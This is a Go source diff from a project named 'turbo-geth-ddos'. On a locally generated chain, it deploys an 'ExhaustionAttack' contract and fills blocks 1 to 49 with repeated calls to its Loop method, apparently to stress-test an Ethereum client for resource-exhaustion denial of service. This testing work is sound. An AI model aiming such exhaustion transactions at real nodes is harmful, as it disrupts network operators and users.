@@ -2,7 +2,6 @@ package main
 
 import (
 	"context"
-	"fmt"
 	"math/big"
 
 	"github.com/Giulio2002/turbo-geth-ddos/contracts"
@@ -53,15 +52,22 @@ func main() {
 	transactOpts.GasPrice = big.NewInt(6000000000)
 	transactOpts.GasLimit = 790000 // 7.9 Million of gas
 
-	blocks, _ := core.GenerateChain(context.Background(), gspec.Config, genesis, engine, genesisDb, 258, func(i int, block *core.BlockGen) {
+	blocks, _ := core.GenerateChain(context.Background(), gspec.Config, genesis, engine, genesisDb, 300, func(i int, block *core.BlockGen) {
 		var (
 			tx  *types.Transaction
 			txs []*types.Transaction
 		)
 
-		switch i {
-		case 0:
+		switch {
+		case i == 0:
 			_, tx, exhaustion, _ = contracts.DeployExhaustionAttack(transactOpts, contractBackend)
+		case i < 50 && i != 0:
+			for i := 0; i < 25; i++ {
+				txa, _ := exhaustion.Loop(transactOpts)
+				transactOpts = bind.NewKeyedTransactor(key)
+				transactOpts.GasPrice = big.NewInt(6000000000)
+				txs = append(txs, txa)
+			}
 		}
 
 		if txs == nil && tx != nil {
@@ -73,12 +79,4 @@ func main() {
 		contractBackend.Commit()
 	})
 	blockchain.InsertChain(context.Background(), blocks)
-	for i := 0; i < 10000; i++ {
-		go func() {
-			// blockchain.InsertChain(context.Background(), blocks)
-			exhaustion.Loop(nil)
-			fmt.Println("done")
-		}()
-	}
-	exhaustion.Loop(nil)
 }
